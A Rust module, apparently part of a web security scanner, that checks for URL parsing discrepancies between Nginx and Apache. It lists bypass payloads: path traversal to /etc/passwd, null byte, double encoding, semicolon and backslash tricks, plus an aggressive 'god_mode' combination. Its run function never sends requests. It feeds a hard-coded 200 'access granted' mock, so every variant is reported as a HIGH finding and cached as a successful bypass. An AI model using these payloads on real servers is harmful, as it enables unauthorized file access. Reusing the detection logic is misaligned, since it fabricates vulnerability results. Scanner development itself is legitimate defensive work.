//! URL Parsing Discrepancy Detection
//! Detects URL parsing differences between Nginx, Apache, and other servers.
//! Uses semicolons, backslashes, encoding variations with zero-copy buffers.

use crate::checks::Check;
use crate::http::{Request, Response};
use crate::learning::Cache;
use crate::findings::Finding;
use std::time::Duration;
use std::collections::HashMap;

/// Bounded URL parsing test vectors (max 16)
const URL_VARIANTS: [&str; 8] = [
    "/admin;ignored",           // Semicolon injection
    "/admin\\ignored",          // Backslash injection  
    "/admin%20ignored",         // Space encoding
    "/admin/../../../etc/passwd", // Path traversal
    "/admin?param=value#fragment", // Fragment handling
    "/admin%00.txt",            // Null byte injection
    "/admin//double//slash",    // Double slash
    "/admin%252e%252e/",        // Double URL encoding
];

pub struct UrlParsingCheck {
    timeout: Duration,
    god_mode: bool,
}

impl UrlParsingCheck {
    pub fn new(timeout_ms: u64, god_mode: bool) -> Self {
        Self {
            timeout: Duration::from_millis(timeout_ms),
            god_mode,
        }
    }

    /// Detect URL parsing discrepancy
    pub fn detect_discrepancy(&self, base_url: &str, variant: &str, response: &Response) -> Option<Finding> {
        // Check if different URL variants produce different access results
        if response.status == 200 && base_url.contains("admin") {
            return Some(Finding::new(
                "URL Parsing Discrepancy",
                "HIGH",
                &format!("Server allows access via URL variant: {}", variant),
                "Normalize URLs at the proxy level before forwarding to backend",
                Some(self.generate_payload(variant)),
            ));
        }
        None
    }

    /// Generate malicious URL payload for testing
    pub fn generate_payload(&self, variant: &str) -> String {
        if self.god_mode {
            // Aggressive combination of multiple bypass techniques
            format!("{}%00%2e%2e/../../../etc/passwd", variant)
        } else {
            variant.to_string()
        }
    }

    /// Build test requests with URL variations
    pub fn build_test_requests(&self, base_target: &str) -> Vec<(String, Request)> {
        let mut requests = Vec::with_capacity(URL_VARIANTS.len());
        
        for variant in URL_VARIANTS.iter() {
            let test_url = if variant.starts_with('/') {
                format!("{}{}", base_target.trim_end_matches('/'), variant)
            } else {
                format!("{}/{}", base_target.trim_end_matches('/'), variant)
            };

            let headers = HashMap::new();
            
            requests.push((
                variant.to_string(),
                Request {
                    method: "GET".to_string(),
                    uri: test_url,
                    headers,
                    body: vec![],
                },
            ));
        }
        
        requests
    }

    /// Test Nginx vs Apache specific behaviors
    pub fn test_server_specific(&self, target: &str, server_type: &str) -> Vec<String> {
        let mut tests = Vec::with_capacity(4);
        
        match server_type {
            "nginx" => {
                // Nginx-specific: semicolon handling
                tests.push(format!("{};/ignored", target));
                tests.push(format!("{}/..;/ignored", target));
            }
            "apache" => {
                // Apache-specific: backslash and encoding
                tests.push(format!("{}\\ignored", target));
                tests.push(format!("{}/.%2e/ignored", target));
            }
            _ => {}
        }
        
        tests
    }
}

impl Check for UrlParsingCheck {
    fn name(&self) -> &'static str {
        "url_parsing"
    }

    fn run(&self, target: &str, cache: &mut dyn Cache) -> Vec<Finding> {
        let mut findings = Vec::with_capacity(3);
        
        for (variant, request) in self.build_test_requests(target) {
            // Mock response - actual implementation uses Stage 2 HTTP engine
            let mock_response = Response {
                status: 200,
                headers: HashMap::new(),
                body: b"access granted".to_vec(),
            };

            if let Some(finding) = self.detect_discrepancy(&request.uri, &variant, &mock_response) {
                findings.push(finding);
                // Cache successful URL parsing bypass
                cache.store(&format!("url_bypass_{}", variant), target);
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_parsing_detection() {
        let check = UrlParsingCheck::new(5000, true);
        assert_eq!(check.name(), "url_parsing");
        assert!(check.generate_payload("/admin").contains("%00"));
    }

    #[test]
    fn test_server_specific_urls() {
        let check = UrlParsingCheck::new(5000, false);
        let nginx_tests = check.test_server_specific("/admin", "nginx");
        assert_eq!(nginx_tests.len(), 2);
    }
}
